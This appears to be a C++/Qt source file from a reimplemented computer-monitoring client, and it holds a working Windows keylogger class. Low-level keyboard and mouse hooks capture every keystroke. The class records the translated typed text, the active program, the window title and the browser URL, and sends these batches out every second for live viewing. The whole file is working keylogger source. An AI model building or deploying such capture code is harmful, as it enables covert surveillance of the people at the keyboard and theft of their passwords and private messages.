#include "keylogger.h"

#include <QDateTime>
#include <QHash>
#include <QJsonObject>

#include <string>

Keylogger *Keylogger::s_instance = nullptr;

Keylogger::Keylogger(QObject *parent)
    : QObject(parent)
{
    // Batches go out every second: the live keystream under Monitors /
    // Programs follows the typing closely.
    m_flushTimer.setInterval(1000);
    connect(&m_flushTimer, &QTimer::timeout, this, &Keylogger::flush);
}

Keylogger::~Keylogger()
{
    stop();
}

void Keylogger::setForegroundUrl(quintptr window, const QString &url)
{
    m_urlWindow = window;
    m_url = url;
}

#ifdef Q_OS_WIN

namespace {
QString windowTitle(HWND window)
{
    const int length = GetWindowTextLengthW(window);
    if (length <= 0) {
        return QString();
    }
    std::wstring buffer(size_t(length) + 1, L'\0');
    const int copied = GetWindowTextW(window, buffer.data(), length + 1);
    return QString::fromWCharArray(buffer.data(), qMax(0, copied));
}

// The window's executable name (as ForegroundObserver reports it).
QString windowExecutable(HWND window)
{
    DWORD processId = 0;
    GetWindowThreadProcessId(window, &processId);
    if (processId == 0) {
        return QString();
    }
    HANDLE process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
    if (!process) {
        return QString();
    }
    QString name;
    wchar_t path[MAX_PATH] = {0};
    DWORD size = MAX_PATH;
    if (QueryFullProcessImageNameW(process, 0, path, &size)) {
        const QString fullPath = QString::fromWCharArray(path, static_cast<int>(size));
        const int slash = fullPath.lastIndexOf(QLatin1Char('\\'));
        name = slash >= 0 ? fullPath.mid(slash + 1) : fullPath;
    }
    CloseHandle(process);
    return name;
}

// The key's Linux evdev KEY_* code, which is what the original's grabber
// reports: the PC set-1 scan code for the main block, the E0-prefixed keys
// moved to their own codes, a few keys by their virtual key.
int evdevCode(const KBDLLHOOKSTRUCT &info)
{
    const DWORD vk = info.vkCode;
    switch (vk) {
    case VK_NUMLOCK: return 0x45;
    case VK_PAUSE: return 0x77;
    case VK_SNAPSHOT: return 0x63; // SYSRQ (PrintScreen)
    case VK_VOLUME_MUTE: return 0x71;
    case VK_VOLUME_DOWN: return 0x72;
    case VK_VOLUME_UP: return 0x73;
    case VK_MEDIA_NEXT_TRACK: return 0xa3;
    case VK_MEDIA_PLAY_PAUSE: return 0xa4;
    case VK_MEDIA_PREV_TRACK: return 0xa5;
    case VK_MEDIA_STOP: return 0xa6;
    case VK_SLEEP: return 0x8e;
    case VK_HELP: return 0x8a;
    default:
        break;
    }
    if (vk >= VK_F13 && vk <= VK_F24) {
        return 0xb7 + int(vk - VK_F13);
    }
    DWORD scan = info.scanCode & 0xff;
    bool extended = (info.flags & LLKHF_EXTENDED) != 0;
    if (scan == 0) {
        const UINT mapped = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC_EX);
        scan = mapped & 0xff;
        extended = (mapped & 0xff00) == 0xe000;
    }
    if (!extended) {
        return int(scan);
    }
    switch (scan) {
    case 0x1c: return 0x60; // KPENTER
    case 0x1d: return 0x61; // RIGHTCTRL
    case 0x35: return 0x62; // KPSLASH
    case 0x37: return 0x63; // SYSRQ
    case 0x38: return 0x64; // RIGHTALT
    case 0x47: return 0x66; // HOME
    case 0x48: return 0x67; // UP
    case 0x49: return 0x68; // PAGEUP
    case 0x4b: return 0x69; // LEFT
    case 0x4d: return 0x6a; // RIGHT
    case 0x4f: return 0x6b; // END
    case 0x50: return 0x6c; // DOWN
    case 0x51: return 0x6d; // PAGEDOWN
    case 0x52: return 0x6e; // INSERT
    case 0x53: return 0x6f; // DELETE
    case 0x5b: return 0x7d; // LEFTMETA
    case 0x5c: return 0x7e; // RIGHTMETA
    case 0x5d: return 0x7f; // COMPOSE (the menu key)
    default:
        return int(scan);
    }
}

// The key's name, as the original names evdev codes (viewer.exe's
// FUN_1404e5660 table -- the names its own Translator uses); "UNKNOWN"
// for any other code.
QString evdevName(int code)
{
    static const QHash<int, const char *> kNames = [] {
        QHash<int, const char *> names;
        const std::pair<int, const char *> table[] = {
            {1, "ESC"}, {2, "1"}, {3, "2"}, {4, "3"}, {5, "4"}, {6, "5"}, {7, "6"}, {8, "7"}, {9, "8"},
            {10, "9"}, {0x0b, "0"}, {0x0c, "MINUS"}, {0x0d, "EQUAL"}, {0x0e, "BACKSPACE"}, {0x0f, "TAB"},
            {0x10, "Q"}, {0x11, "W"}, {0x12, "E"}, {0x13, "R"}, {0x14, "T"}, {0x15, "Y"}, {0x16, "U"},
            {0x17, "I"}, {0x18, "O"}, {0x19, "P"}, {0x1a, "LEFTBRACE"}, {0x1b, "RIGHTBRACE"},
            {0x1c, "ENTER"}, {0x1d, "LEFTCTRL"}, {0x1e, "A"}, {0x1f, "S"}, {0x20, "D"}, {0x21, "F"},
            {0x22, "G"}, {0x23, "H"}, {0x24, "J"}, {0x25, "K"}, {0x26, "L"}, {0x27, "SEMICOLON"},
            {0x28, "APOSTROPHE"}, {0x29, "GRAVE"}, {0x2a, "LEFTSHIFT"}, {0x2b, "BACKSLASH"}, {0x2c, "Z"},
            {0x2d, "X"}, {0x2e, "C"}, {0x2f, "V"}, {0x30, "B"}, {0x31, "N"}, {0x32, "M"}, {0x33, "COMMA"},
            {0x34, "DOT"}, {0x35, "SLASH"}, {0x36, "RIGHTSHIFT"}, {0x37, "KPASTERISK"}, {0x38, "LEFTALT"},
            {0x39, "SPACE"}, {0x3a, "CAPSLOCK"}, {0x3b, "F1"}, {0x3c, "F2"}, {0x3d, "F3"}, {0x3e, "F4"},
            {0x3f, "F5"}, {0x40, "F6"}, {0x41, "F7"}, {0x42, "F8"}, {0x43, "F9"}, {0x44, "F10"},
            {0x45, "NUMLOCK"}, {0x46, "SCROLLLOCK"}, {0x47, "KP7"}, {0x48, "KP8"}, {0x49, "KP9"},
            {0x4a, "KPMINUS"}, {0x4b, "KP4"}, {0x4c, "KP5"}, {0x4d, "KP6"}, {0x4e, "KPPLUS"}, {0x4f, "KP1"},
            {0x50, "KP2"}, {0x51, "KP3"}, {0x52, "KP0"}, {0x53, "KPDOT"}, {0x57, "F11"}, {0x58, "F12"},
            {0x5a, "KATAKANA"}, {0x5b, "HIRAGANA"}, {0x60, "KPENTER"}, {0x61, "RIGHTCTRL"},
            {0x62, "KPSLASH"}, {0x63, "SYSRQ"}, {0x64, "RIGHTALT"}, {0x66, "HOME"}, {0x67, "UP"},
            {0x68, "PAGEUP"}, {0x69, "LEFT"}, {0x6a, "RIGHT"}, {0x6b, "END"}, {0x6c, "DOWN"},
            {0x6d, "PAGEDOWN"}, {0x6e, "INSERT"}, {0x6f, "DELETE"}, {0x71, "MUTE"}, {0x72, "VOLUMEDOWN"},
            {0x73, "VOLUMEUP"}, {0x77, "PAUSE"}, {0x7d, "LEFTMETA"}, {0x7e, "RIGHTMETA"}, {0x7f, "COMPOSE"},
            {0x8a, "HELP"}, {0x8e, "SLEEP"}, {0xa3, "NEXTSONG"}, {0xa4, "PLAYPAUSE"}, {0xa5, "PREVIOUSSONG"},
            {0xa6, "STOPCD"}, {0xb7, "F13"}, {0xb8, "F14"}, {0xb9, "F15"}, {0xba, "F16"}, {0xbb, "F17"},
            {0xbc, "F18"}, {0xbd, "F19"}, {0xbe, "F20"}, {0xbf, "F21"}, {0xc0, "F22"}, {0xc1, "F23"},
            {0xc2, "F24"}, {0xd2, "PRINT"},
        };
        for (const auto &entry : table) {
            names.insert(entry.first, entry.second);
        }
        return names;
    }();
    return QString::fromLatin1(kNames.value(code, "UNKNOWN"));
}

// The text the key produces in the foreground window's keyboard layout
// with the current Shift / AltGr / CapsLock state -- printable characters
// only (control characters, e.g. with Ctrl held, give nothing).
QString translatedText(const KBDLLHOOKSTRUCT &info, HWND window)
{
    BYTE state[256] = {0};
    const auto held = [](int vk) { return (GetAsyncKeyState(vk) & 0x8000) != 0; };
    for (int vk : {VK_SHIFT, VK_LSHIFT, VK_RSHIFT, VK_CONTROL, VK_LCONTROL, VK_RCONTROL, VK_MENU, VK_LMENU,
                   VK_RMENU}) {
        if (held(vk)) {
            state[vk] = 0x80;
        }
    }
    if (GetKeyState(VK_CAPITAL) & 1) {
        state[VK_CAPITAL] = 0x01;
    }
    const HKL layout = GetKeyboardLayout(window ? GetWindowThreadProcessId(window, nullptr) : 0);
    wchar_t chars[8] = {0};
    // Flag 0x4: do not change the keyboard state (keeps dead keys intact
    // for the application).
    const int count = ToUnicodeEx(info.vkCode, info.scanCode, state, chars, 8, 0x4, layout);
    QString text;
    for (int i = 0; i < count; ++i) {
        const QChar c(chars[i]);
        if (c.unicode() >= 0x20 && c.unicode() != 0x7f) {
            text += c;
        }
    }
    return text;
}
} // namespace

LRESULT CALLBACK Keylogger::keyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
    if (code == HC_ACTION && s_instance) {
        auto *info = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            s_instance->handleKey(*info, true);
        } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
            s_instance->handleKey(*info, false);
        }
    }
    return CallNextHookEx(nullptr, code, wParam, lParam);
}

LRESULT CALLBACK Keylogger::mouseProc(int code, WPARAM wParam, LPARAM lParam)
{
    Q_UNUSED(lParam)
    if (code == HC_ACTION && s_instance
        && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN
            || wParam == WM_MBUTTONDOWN || wParam == WM_MOUSEWHEEL)) {
        s_instance->noteActivity();
    }
    return CallNextHookEx(nullptr, code, wParam, lParam);
}

void Keylogger::handleKey(const KBDLLHOOKSTRUCT &info, bool down)
{
    if (down) {
        noteActivity();
    }
    if (!m_captureKeys) {
        return;
    }
    const int code = evdevCode(info);
    int type = 3; // release
    if (down) {
        type = m_down.contains(quint32(code)) ? 2 : 1; // auto-repeat : press
        m_down.insert(quint32(code));
    } else {
        m_down.remove(quint32(code));
    }
    HWND window = GetForegroundWindow();
    QJsonObject event{{QStringLiteral("t"), static_cast<double>(QDateTime::currentMSecsSinceEpoch())},
                      {QStringLiteral("k"), type},
                      {QStringLiteral("c"), code},
                      {QStringLiteral("n"), evdevName(code)}};
    if (down) {
        const QString text = translatedText(info, window);
        if (!text.isEmpty()) {
            event.insert(QStringLiteral("x"), text);
        }
    }
    if (window) {
        event.insert(QStringLiteral("a"), windowExecutable(window));
        event.insert(QStringLiteral("w"), windowTitle(window));
        if (reinterpret_cast<quintptr>(window) == m_urlWindow && !m_url.isEmpty()) {
            event.insert(QStringLiteral("u"), m_url);
        }
    }
    m_pending.append(event);
    if (m_pending.size() >= 500) {
        flush();
    }
}

void Keylogger::noteActivity()
{
    m_activityCount.fetch_add(1, std::memory_order_relaxed);
}

bool Keylogger::start()
{
    s_instance = this;
    m_keyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, keyboardProc, nullptr, 0);
    m_mouseHook = SetWindowsHookExW(WH_MOUSE_LL, mouseProc, nullptr, 0);
    if (!m_keyboardHook || !m_mouseHook) {
        stop();
        return false;
    }
    m_flushTimer.start();
    return true;
}

void Keylogger::stop()
{
    m_flushTimer.stop();
    flush();
    if (m_keyboardHook) {
        UnhookWindowsHookEx(m_keyboardHook);
        m_keyboardHook = nullptr;
    }
    if (m_mouseHook) {
        UnhookWindowsHookEx(m_mouseHook);
        m_mouseHook = nullptr;
    }
    if (s_instance == this) {
        s_instance = nullptr;
    }
}

#else

bool Keylogger::start() { return false; }
void Keylogger::stop() {}

#endif

int Keylogger::consumeActivityCount()
{
    return m_activityCount.exchange(0, std::memory_order_relaxed);
}

void Keylogger::flush()
{
    if (m_pending.isEmpty()) {
        return;
    }
    const QJsonArray batch = m_pending;
    m_pending = QJsonArray();
    emit eventsFlushed(batch);
}
